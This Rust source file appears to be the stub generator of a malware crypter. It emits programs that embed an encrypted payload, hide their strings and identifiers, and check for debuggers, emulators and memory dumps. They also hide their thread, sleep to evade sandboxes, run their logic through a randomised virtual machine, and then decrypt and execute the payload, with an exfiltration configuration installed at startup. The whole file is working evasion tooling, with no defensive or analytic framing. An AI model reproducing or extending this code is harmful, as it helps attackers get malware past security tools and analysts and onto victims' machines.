mod emit_antidump;
mod emit_crypto;
mod emit_exec;
mod emit_gates;
mod emit_integrity;
mod emit_junk;
mod emit_peb;
mod emit_strings;
mod emit_vm;

use crypter_ir::*;
use crypter_vm::{seed_for_build, Encoding, ProgramBuilder};
use rand::rngs::StdRng;
use rand::{Rng, SeedableRng};
use sha2::{Digest, Sha256};

pub struct Synth {
    pub(crate) rng: StdRng,
    pub(crate) xor_key: [u8; 32],
}

impl Synth {
    pub fn new(seed: [u8; 32], xor_key: [u8; 32]) -> Self {
        Self {
            rng: StdRng::from_seed(seed),
            xor_key,
        }
    }

    pub fn emit(&mut self, prog: &StubProgram) -> String {
        let payload_hash = {
            let mut h = Sha256::new();
            h.update(&prog.payload_blob);
            let d = h.finalize();
            let mut arr = [0u8; 32];
            arr.copy_from_slice(&d);
            arr
        };
        let isa_nonce = {
            let mut n = [0u8; 16];
            self.rng.fill(&mut n);
            n
        };
        let isa_seed = seed_for_build(&payload_hash, &isa_nonce);
        let encoding = Encoding::from_seed(&isa_seed);

        let mut out = String::with_capacity(64 * 1024);
        out.push_str("#![allow(unused_imports, unused_variables, dead_code, non_snake_case, non_upper_case_globals, unused_mut, unused_assignments, unreachable_code, unused_parens)]\n");
        out.push_str("use std::ffi::c_void;\nuse std::mem;\nuse std::ptr;\nuse std::hint::black_box;\n\n");

        let k_payload = self.ident("pay");
        let k_xor = self.ident("xk");
        let k_salt = self.ident("slt");
        let k_nonce = self.ident("non");
        let k_wrapped = self.ident("wk");
        let k_seed = self.ident("sd");
        let k_directive = self.ident("dir");
        let k_build_id = self.ident("bid");

        emit_const_bytes(&mut out, &k_payload, &prog.payload_blob);
        emit_const_bytes32(&mut out, &k_xor, &self.xor_key);
        emit_const_bytes(&mut out, &k_salt, &prog.key_material.salt);
        emit_const_bytes(&mut out, &k_nonce, &prog.key_material.nonce);
        emit_const_bytes32(&mut out, &k_wrapped, &prog.wrapped_key);
        emit_const_bytes32(&mut out, &k_seed, &prog.seed);
        out.push_str(&format!(
            "const {}: &str = {:?};\n",
            k_directive, prog.directive_json
        ));
        out.push_str(&format!(
            "const {}: &str = {:?};\n\n",
            k_build_id, prog.build_id
        ));

        out.push_str(&encoding.emit_rust());
        out.push('\n');

        out.push_str(&emit_peb::emit_peb_helpers(prog));
        out.push_str(&emit_strings::emit_encrypted_strings(
            &mut self.rng,
            &self.xor_key,
        ));
        out.push_str(&emit_gates::emit_exfil_config_setup(prog));
        out.push_str(&emit_gates::emit_directive_setup(&k_directive));

        let mut gate_fns = Vec::new();
        for gate in &prog.gates {
            let fn_name = self.ident("g");
            let body = emit_gates::emit_gate(&mut self.rng, &fn_name, gate, &self.xor_key);
            out.push_str(&body);
            gate_fns.push(fn_name);
        }

        let dbg_fn = self.ident("dbg");
        out.push_str(&emit_gates::emit_debug_check(&dbg_fn, &prog.debug_check));

        let emu_fn = self.ident("emu");
        if prog.anti_emulation {
            out.push_str(&emit_gates::emit_anti_emulation(&emu_fn, 5000, 0.8));
        } else {
            out.push_str(&format!("fn {}() -> bool {{ true }}\n\n", emu_fn));
        }

        let nt_hide_fn = self.ident("hth");
        out.push_str(&emit_gates::emit_hide_thread_fn(&nt_hide_fn));

        let antidump = self.ident("adp");
        out.push_str(&emit_antidump::emit_antidump_fn(
            &antidump,
            prog.target_os.clone(),
        ));

        out.push_str(&emit_crypto::emit_crypto_for(&prog.decrypt));

        let dec_fn = self.ident("dec");
        out.push_str(&self.emit_decrypt_fn(
            &dec_fn,
            &prog.decrypt,
            &k_payload,
            &k_wrapped,
            &k_seed,
            &k_xor,
        ));

        let exec_fn = self.ident("exec");
        out.push_str(&emit_exec::emit_exec_fn(&exec_fn, &prog.execution, &prog.target_os));

        let intg_fn = self.ident("chk");
        out.push_str(&emit_integrity::emit_integrity(&intg_fn, &prog.integrity, &k_payload));

        let vm_fn = self.ident("vm");
        let builder = self.build_vm_program(
            &encoding,
            &gate_fns,
            &dbg_fn,
            &emu_fn,
            &dec_fn,
            &intg_fn,
            &exec_fn,
            prog,
        );
        out.push_str(&emit_vm::emit_vm_fn(
            &vm_fn,
            &builder.emit_bytes(),
            &gate_fns,
            &dbg_fn,
            &emu_fn,
            &dec_fn,
            &intg_fn,
            &exec_fn,
            &antidump,
            prog,
        ));

        out.push_str("fn main() {\n");
        out.push_str("    svc_install_exfil_cfg();\n");
        out.push_str("    svc_set_directive();\n");
        out.push_str(&format!("    std::env::set_var(\"SVC_BUILD_ID\", {});\n", k_build_id));
        out.push_str(&format!("    std::env::set_var(\"SVC_BUILD_SEED\", hex_encode_32(&{}));\n", k_seed));
        out.push_str(&format!("    {}();\n", nt_hide_fn));

        if let Some(Gate::SleepJitter { min_ms, max_ms }) = prog
            .gates
            .iter()
            .find(|g| matches!(g, Gate::SleepJitter { .. }))
        {
            out.push_str(&format!(
                "    std::thread::sleep(std::time::Duration::from_millis({}));\n",
                self.rng.gen_range(*min_ms..=*max_ms)
            ));
        }

        if prog.anti_dump {
            out.push_str(&format!("    {}::install_watchdog();\n", antidump));
        }

        out.push_str(&format!("    {}();\n", vm_fn));
        out.push_str(&emit_junk::emit_junk_block(&mut self.rng, prog.junk_density));
        out.push_str("}\n\n");

        out.push_str("fn hex_encode_32(b: &[u8; 32]) -> String {\n");
        out.push_str("    const H: &[u8; 16] = b\"0123456789abcdef\";\n");
        out.push_str("    let mut s = String::with_capacity(64);\n");
        out.push_str("    for &x in b.iter() {\n");
        out.push_str("        s.push(H[(x >> 4) as usize] as char);\n");
        out.push_str("        s.push(H[(x & 0xf) as usize] as char);\n");
        out.push_str("    }\n");
        out.push_str("    s\n");
        out.push_str("}\n");

        out
    }

    fn build_vm_program(
        &mut self,
        encoding: &Encoding,
        gate_fns: &[String],
        dbg_fn: &str,
        emu_fn: &str,
        dec_fn: &str,
        intg_fn: &str,
        exec_fn: &str,
        prog: &StubProgram,
    ) -> ProgramBuilder {
        let mut b = ProgramBuilder::new(encoding.clone());

        if prog.anti_emulation {
            b.op(crypter_vm::Op::CheckAntiEmu);
        }
        b.op(crypter_vm::Op::CheckDebug);

        let mut gs: Vec<usize> = (0..gate_fns.len()).collect();
        for i in (1..gs.len()).rev() {
            let j = self.rng.gen_range(0..=i);
            gs.swap(i, j);
        }
        for idx in gs {
            b.op(crypter_vm::Op::CallGate);
            b.u8(idx as u8);
        }

        b.op(crypter_vm::Op::CheckIntegrity);
        b.op(crypter_vm::Op::UnwrapKey);
        b.op(crypter_vm::Op::Decrypt);
        b.op(crypter_vm::Op::Protect);
        b.op(crypter_vm::Op::Exec);
        b.op(crypter_vm::Op::HaltOk);
        b.emit_bytes();
        b
    }

    fn ident(&mut self, prefix: &str) -> String {
        let alphabet: Vec<u8> = b"abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ".to_vec();
        let len = self.rng.gen_range(6..12);
        let mut s = String::from(prefix);
        s.push('_');
        for _ in 0..len {
            s.push(alphabet[self.rng.gen_range(0..alphabet.len())] as char);
        }
        s
    }

    fn emit_decrypt_fn(
        &mut self,
        name: &str,
        scheme: &DecryptScheme,
        payload: &str,
        wrapped: &str,
        seed: &str,
        xor_key: &str,
    ) -> String {
        let mut s = format!("fn {}() -> Option<Vec<u8>> {{\n", name);
        s.push_str(&format!("    let blob = {};\n", payload));
        s.push_str(&format!("    let wk = {};\n", wrapped));
        s.push_str(&format!("    let seed = {};\n", seed));
        s.push_str(&format!("    let xk = {};\n", xor_key));
        s.push_str("    let mut key = [0u8; 32];\n");
        s.push_str("    for i in 0..32 { key[i] = wk[i] ^ seed[i] ^ xk[i]; }\n");
        match scheme {
            DecryptScheme::AesGcm => {
                s.push_str("    if blob.len() < 12 + 16 { return None; }\n");
                s.push_str("    let (nonce, ct) = blob.split_at(12);\n");
                s.push_str("    let mut out = vec![0u8; ct.len().saturating_sub(16)];\n");
                s.push_str("    aes_gcm_decrypt(&key, nonce, ct, &mut out).ok()?;\n");
                s.push_str("    Some(out)\n");
            }
            DecryptScheme::ChaCha20Poly1305 => {
                s.push_str("    if blob.len() < 12 + 16 { return None; }\n");
                s.push_str("    let (nonce, ct) = blob.split_at(12);\n");
                s.push_str("    let mut out = vec![0u8; ct.len().saturating_sub(16)];\n");
                s.push_str("    chacha_decrypt(&key, nonce, ct, &mut out).ok()?;\n");
                s.push_str("    Some(out)\n");
            }
            DecryptScheme::AesCbcHmac => {
                s.push_str("    if blob.len() < 16 + 32 + 16 { return None; }\n");
                s.push_str("    let (iv, rest) = blob.split_at(16);\n");
                s.push_str("    let (mac, ct) = rest.split_at(32);\n");
                s.push_str("    let mut out = vec![0u8; ct.len()];\n");
                s.push_str("    aes_cbc_hmac_decrypt(&key, iv, mac, ct, &mut out).ok()?;\n");
                s.push_str("    Some(out)\n");
            }
            DecryptScheme::XorDerived => {
                s.push_str("    let mut out = blob.to_vec();\n");
                s.push_str("    for (i, b) in out.iter_mut().enumerate() { *b ^= key[i % key.len()]; }\n");
                s.push_str("    Some(out)\n");
            }
        }
        s.push_str("}\n\n");
        s
    }
}

fn emit_const_bytes(out: &mut String, name: &str, bytes: &[u8]) {
    if bytes.is_empty() {
        out.push_str(&format!("const {}: [u8; 0] = [];\n", name));
        return;
    }
    out.push_str(&format!("const {}: [u8; {}] = [", name, bytes.len()));
    for (i, b) in bytes.iter().enumerate() {
        if i > 0 {
            out.push(',');
        }
        out.push_str(&format!("{:#04x}", b));
    }
    out.push_str("];\n");
}

fn emit_const_bytes32(out: &mut String, name: &str, bytes: &[u8; 32]) {
    out.push_str(&format!("const {}: [u8; 32] = [", name));
    for (i, b) in bytes.iter().enumerate() {
        if i > 0 {
            out.push(',');
        }
        out.push_str(&format!("{:#04x}", b));
    }
    out.push_str("];\n");
}
